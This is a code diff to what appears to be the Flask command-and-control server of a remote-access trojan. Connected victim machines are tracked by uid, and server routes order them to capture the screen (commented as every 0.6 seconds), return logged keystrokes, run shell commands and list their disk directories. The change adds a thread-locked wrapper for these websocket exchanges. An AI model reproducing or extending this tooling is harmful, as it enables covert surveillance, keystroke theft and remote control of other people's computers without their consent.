@@ -7,15 +7,35 @@ from flask import Flask, jsonify, request, render_template
 from flask_sockets import Sockets
 from tempfile import NamedTemporaryFile
 import time
+import threading
 
 app = Flask(__name__)
 sockets = Sockets(app)
 cache = {}
 
 
-@app.errorhandler
-def errorhandler(err):
-    return jsonify({"code": err})
+class MSG:
+    def __init__(self, ws):
+        """
+        存放客户端，用于后期收发消息加锁
+        :param ws:
+        """
+        self.lock = threading.RLock()
+        self.ws = ws
+
+    def get_data(self, data: dict) -> dict:
+        wait_data = json.dumps(data)
+        _data = {}
+        self.lock.acquire()
+        try:
+            self.ws.send(wait_data)
+            _data = self.ws.receive()
+        except Exception as e:
+            pass
+        finally:
+            self.lock.release()
+            pass
+        return json.loads(_data)
 
 
 @app.route('/')
@@ -32,7 +52,7 @@ def api():
 def ping(ws):
     msg = json.loads(ws.receive())
     uid = msg['uid']
-    cache.update({uid: [ws, msg["system"], msg["disk"]]})
+    cache.update({uid: [MSG(ws), msg["system"], msg["disk"]]})
     try:
         while not ws.closed:
             time.sleep(10)
@@ -46,20 +66,16 @@ def ping(ws):
 @app.route('/capture/<uid>', methods=['GET', 'POST'])
 def capture(uid):
     if request.method == "GET":
-        return render_template('capture.html')
+        return render_template('capture.html', speed=0.6)  # 0.6秒抓取一次屏幕
     else:
-        ws = cache[uid][0]
-        ws.send(json.dumps({"v_uid": "0222", "type": "capture"}))
-        msg = json.loads(ws.receive())
-        return jsonify(msg)
+        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "capture"})
+        return jsonify(_data)
 
 
 @app.route('/key/<uid>', methods=['GET', 'POST'])
 def key(uid):
-    ws = cache[uid][0]
-    ws.send(json.dumps({"v_uid": "0222", "type": "key"}))
-    msg = json.loads(ws.receive())
-    code = base64.b64decode(msg["data"]).decode()
+    _data = cache[uid][0].get_data({"v_uid": "0222", "type": "key"})
+    code = base64.b64decode(_data["data"]).decode()
     return render_template('key.html', code=code)
 
 
@@ -68,11 +84,9 @@ def shell(uid):
     if request.method == "GET":
         return render_template('shell.html')
     else:
-        ws = cache[uid][0]
         _key = json.loads(request.data.decode())["data"]
-        ws.send(json.dumps({"v_uid": "0222", "type": "shell", "data": _key}))
-        msg = json.loads(ws.receive())
-        return jsonify(msg)
+        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "shell", "data": _key})
+        return jsonify(_data)
 
 
 @app.route('/file/<uid>', methods=['GET', 'POST'])
@@ -80,11 +94,9 @@ def file(uid):
     if request.method == "GET":
         return render_template('file.html', disk_root=[{"title": e_disk_path, "id": e_disk_path} for e_disk_path in cache[uid][2]])
     else:
-        ws, disk = cache[uid][0], cache[uid][2]
         _dir = request.form.get("dir")
-        ws.send(json.dumps({"v_uid": "0222", "type": "dir", "data": _dir}))
-        msg = json.loads(ws.receive())
-        return jsonify({"code": 0, "data": msg["raw"]})
+        _data = cache[uid][0].get_data({"v_uid": "0222", "type": "dir", "data": _dir})
+        return jsonify({"code": 0, "data": _data["raw"]})
 
 
 if __name__ == '__main__':
